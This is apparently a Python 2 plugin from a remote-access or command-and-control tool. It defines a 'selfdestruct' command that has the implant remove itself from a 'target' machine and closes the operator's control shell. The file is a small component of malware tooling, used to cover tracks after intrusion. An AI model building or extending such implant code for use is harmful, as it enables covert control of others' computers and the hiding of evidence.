import module
import debug

import sys

MODNAME = 'selfdestruct'
USAGE = """Self destruct.
usage: selfdestruct [-h]
\nPermanently remove client from target.
\noptions:
-h\t\tshow help"""


@module.server_handler(MODNAME)
def server(server, argv):
    if '-h' in argv or '--help' in argv:
        print USAGE
    else:
        print """[!] WARNING: You are about to permanently remove the client from the target.
    You will immediately lose access to the target. Continue? (y/n)""",
        if raw_input().lower()[0] == 'y':
            resp = server.conn.exchange(MODNAME)
            if resp == 'boom':
                debug.info('Exiting control shell')
                server.continue_ = False
            else:
                server.info('Self destruct error: {}'.format(resp))
        else:
            server.info('Aborting self destruct')


@module.client_handler(MODNAME)
def client(client, argv):
    client.selfdestruct()
    client.s.send('boom')
    sys.exit()
